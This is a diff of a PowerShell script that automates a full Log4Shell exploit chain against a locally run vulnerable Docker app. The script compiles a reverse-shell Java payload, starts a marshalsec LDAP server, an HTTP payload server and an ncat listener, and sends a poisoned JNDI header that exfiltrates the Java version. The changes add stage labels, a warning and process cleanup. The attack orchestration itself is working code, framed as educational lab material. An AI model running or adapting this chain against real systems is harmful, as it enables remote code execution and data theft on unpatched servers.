@@ -5,6 +5,8 @@ Write-Host "This PowerShell script starts multiple processes (netcat listener, m
 Write-Host "For educational purposes we will run through the entire exploit chain, dynamically creating the Java exploit class and ultimately producing a reverse shell on the web server."
 Write-Host "Embeded in the LDAP server logs you will also find an exfiltrated variable `${java:version} ."
 Write-Host ''
+Write-Host "WARNING: This script can be dangerous. Use responsibly." -ForegroundColor Red
+Write-Host ''
 Write-Host "PREREQUISITES:" -ForegroundColor DarkYellow
 Write-Host "    - Docker for Desktop" -ForegroundColor DarkYellow
 Write-Host "    - Java 8" -ForegroundColor DarkYellow
@@ -23,9 +25,9 @@ $ldapPort = "6667"
 $httpFilePort = "6668"
 $target = 'http://' + $lhost + ':' + '8080'
 
-$testHeader = @{ 'X-Api-Version' = 'hello' }
+$testHeader = @{ 'X-Api-Version' = 'Are we there yet?' }
 $envExfilHeader = @{ 'X-Api-Version' = '${jndi:ldap://' + $lhost + ':' + $ldapPort + '/${java:version}}' }
-#$jsonHeader = @{ 'X-Api-Version' = '${jndi:ldap://' + $lhost + ':' + $ldapPort + '/a}' }
+
 
 Write-Host ''
 
@@ -77,7 +79,13 @@ Write-Host "HTTP_FILE_SERVER_PORT.......$httpFilePort" -ForegroundColor Cyan
 Write-Host "TARGET......................$target" -ForegroundColor Cyan
 Write-Host ''
 
-Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
+function Divider {
+    Write-Host ''
+    Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
+    Write-Host ''
+}
+
+Divider
 
 # Check if dependencies are installed/running
 Write-Host "INFO: Checking for installed dependencies.." -ForegroundColor Gray
@@ -137,12 +145,11 @@ Write-Host 'INFO: Internet..OK' -ForegroundColor Gray
 Write-Host ''
 Write-Host "SUCCESS: All dependencies met!" -ForegroundColor Green
 
-Write-Host ''
-Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
+Divider
 Start-Sleep -s 3
-Write-Host ''
 
 #----------------------------------------------------------------------------------------------
+Write-Host "STAGE 1: EXPLOIT PAYLOAD" -ForegroundColor White
 Write-Host "INFO: Creating Java class payload.." -ForegroundColor Gray
 
 # PAYLOAD CREATION
@@ -157,7 +164,7 @@ $null = New-Item ".\exploit\Exploit.java" -ItemType File -Value "$payload" -Forc
 
 # Compile reverse shell payload (Exploit.class)
 Write-Host "INFO: Compiling payload: .\exploit\Exploit.class" -ForegroundColor Gray
-Start-Process -FilePath ".\java\java-se-8u41-ri\bin\javac.exe" -ArgumentList ".\exploit\Exploit.java" -ErrorAction Stop
+Start-Process -FilePath ".\java\java-se-8u41-ri\bin\javac.exe" -ArgumentList ".\exploit\Exploit.java" -ErrorAction Stop -Wait
 
 Write-Host "INFO: Testing payload: .\exploit\Exploit.class" -ForegroundColor Gray
 if (Test-Path -Path '.\exploit\Exploit.class') {
@@ -167,12 +174,10 @@ if (Test-Path -Path '.\exploit\Exploit.class') {
     Write-Host "INFO: Exploitation will not succeed" -ForegroundColor Gray
 }
 
-Write-Host ''
-Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
-Write-Host ''
+Divider
 Start-Sleep -s 3
 #----------------------------------------------------------------------------------------------
-# DOCKER TARGET
+Write-Host "STAGE 2: DOCKER TARGET" -ForegroundColor White
 
 # Start vulnerable docker image
 Write-Host "INFO: Starting Docker container: ghcr.io/christophetd/log4shell-vulnerable-app" -ForegroundColor Gray
@@ -185,6 +190,7 @@ catch {
 }
 
 Write-Host "INFO: Waiting for web server to come online.." -ForegroundColor Gray
+Write-Host "INFO: Testing connection with X-Api-Header: "Are we there yet?".." -ForegroundColor Gray
 $req = 'null'
 while ($req.Content -ne "Hello, world!") {
     try{
@@ -197,12 +203,10 @@ while ($req.Content -ne "Hello, world!") {
 
 Write-Host "SUCCESS: Web server up! - $($req.StatusCode) $($req.Content)" -ForegroundColor Green
 
-Write-Host ''
-Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
-Write-Host ''
+Divider
 Start-Sleep -s 3
 #----------------------------------------------------------------------------------------------
-# JNDI LDAP SERVER
+Write-Host "STAGE 3: LDAP SERVER" -ForegroundColor White
 
 Write-Host "INFO: Using marshalsec's object deserialization vulnerability project" -ForegroundColor Gray
 Write-Host "INFO: https://github.com/mbechler/marshalsec" -ForegroundColor Gray
@@ -221,7 +225,7 @@ Start-Process -FilePath "mvn" -ArgumentList "clean package -DskipTests" -Working
 
 # Compile and run LDAP Ref Server
 Write-Host "INFO: Compiling and running the marshalsec LDAP Ref Server" -ForegroundColor Gray
-Start-Process -FilePath "java" -ArgumentList "-cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://$lhost`:$httpFilePort/exploit/#Exploit" -WorkingDirectory ".\java\marshalsec\target" -ErrorAction Stop
+$ldapProcess = Start-Process -FilePath "java" -ArgumentList "-cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://$lhost`:$httpFilePort/exploit/#Exploit" -WorkingDirectory ".\java\marshalsec\target" -ErrorAction Stop -PassThru
 
 Write-Host "Sleeping 5 seconds" -ForegroundColor Gray
 Start-Sleep -s 5
@@ -241,26 +245,20 @@ if ($($connection).Connected -eq "True") {
     Write-Host "INFO: Check if the LDAP server console is displayed and displaying: Listening on 0.0.0.0:$ldapPort" -ForegroundColor Gray
 }
 
-Write-Host ''
-Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
-Write-Host ''
-
+Divider
 # Start netcat listener to receive the reverse shell
+Write-Host "STAGE 4: NETCAT LISTENER" -ForegroundColor White
 Write-Host "INFO: Starting netcat to receive the reverse shell.." -ForegroundColor Gray
-Start-Process -FilePath ".\tools\ncat.exe" -ArgumentList "-lvn $reverseShellPort" -ErrorAction Stop
+$ncatProcess = Start-Process -FilePath ".\tools\ncat.exe" -ArgumentList "-lvn $reverseShellPort" -ErrorAction Stop -PassThru
 
-Write-Host ''
-Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
-Write-Host ''
-
+Divider
 # Start a python http server to host the exploit payload
+Write-Host "STAGE 5: HTTP SERVER" -ForegroundColor White
 Write-Host "INFO: Starting a python HTTP server to host the exploit code.." -ForegroundColor Gray
-Start-Process -FilePath "python" -ArgumentList "-m http.server $httpFilePort" -ErrorAction Stop
+$httpProcess = Start-Process -FilePath "python" -ArgumentList "-m http.server $httpFilePort" -ErrorAction Stop -PassThru
 
-Write-Host ''
-Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
-Write-Host ''
-
+Divider
+Write-Host "STAGE 6: HTTP REQUEST" -ForegroundColor White
 Start-Sleep -s 3
 
 Write-Host "INFO: Setting up the web request.." -ForegroundColor Gray
@@ -279,47 +277,50 @@ public class TrustAllCertsPolicy : ICertificatePolicy {
 "@
 [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
 
-$headerString = Write-Output $($jsonHeader.Values)
-
 Write-Host "INFO: Sending request to $target" -ForegroundColor Gray
-Write-Host "INFO: Using X-Api-Version header: $headerString" -ForegroundColor Gray
+Write-Host "INFO: Using X-Api-Version header: $($envExfilHeader.Values)" -ForegroundColor Gray
 Write-Host "INFO: Check LDAP server logs for exfiltrated Java version env variable" -ForegroundColor Gray
 
-#$uar = $null
 try {
     $uar = Invoke-WebRequest $target -Headers $envExfilHeader -TimeoutSec 5 -ErrorAction SilentlyContinue
+    Write-Host "SUCCESS: Sent poisoned header to $target" -ForegroundColor Green
 }catch {
     $uar = $_.Exception
 }
 
-Write-Host "SUCCESS: Sent poisoned header to $target" -ForegroundColor Green
-
-Write-Host ''
-Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
-Write-Host ''
-
-Write-Host "SUCCESS: All done!" -ForegroundColor Green
+Divider
+Write-Host "STAGE 7: POST EXPLOITATION" -ForegroundColor White
 Write-Host "Make sure to check the LDAP logs to see the exfiltrated varaible: `${java:version}" -ForegroundColor Gray
 Write-Host "Check the ncat.exe console for `"Ncat: Connection from $lhost`:{RANDOM_PORT}`"" -ForegroundColor Gray
 Write-Host "This indicates a reverse shell was established from the vulnerable web server" -ForegroundColor Gray
 Write-Host "Try typing `"whoami`" to verify the current user (root)!" -ForegroundColor Gray
-
 Write-Host ''
-Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
+Write-Host "SUCCESS: All done!" -ForegroundColor Green
+
+Divider
+
+Start-Sleep -s 3
+
+Write-Host "Clean up.." -ForegroundColor Yellow
 Write-Host ''
 
-Write-Host "Clean up Docker Images?" -ForegroundColor Yellow
-Write-Host ''
-
-$rmDocker = Read-Host -Prompt "Stop and Remove Docker images? (y/n)"
+$rmDocker = Read-Host -Prompt "Stop containers and remove Docker images used by this script? (y/n)"
 if ($rmDocker -eq "y") {
     Write-Host "INFO: Stopping Docker containers matching filter.." -ForegroundColor Gray
     docker ps -q --filter ancestor=ghcr.io/christophetd/log4shell-vulnerable-app | % { docker stop $_ }
     Write-Host ''
-    Write-Host "INFO: Removing Docker containers matching filter.." -ForegroundColor Gray
+    Write-Host "INFO: Removing Docker images matching filter.." -ForegroundColor Gray
     docker ps -aq --filter ancestor=ghcr.io/christophetd/log4shell-vulnerable-app | % { docker rm $_ }
 }
+Write-Host ''
+$rmProcesses = Read-Host -Prompt "Stop and Remove spawned processes? (y/n)"
+if ($rmProcesses -eq "y") {
+    Write-Host "INFO: Stopping HTTP server" -ForegroundColor Gray
+    Stop-Process $httpProcess.Id
+    Write-Host "INFO: Stopping NCAT Listner.." -ForegroundColor Gray
+    Stop-Process $ncatProcess.Id -ErrorAction SilentlyContinue
+    Write-Host "INFO: Stopping LDAP server.." -ForegroundColor Gray
+    Stop-Process $ldapProcess.Id
+}
 
-Write-Host ''
-Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
-Write-Host ''
+Divider
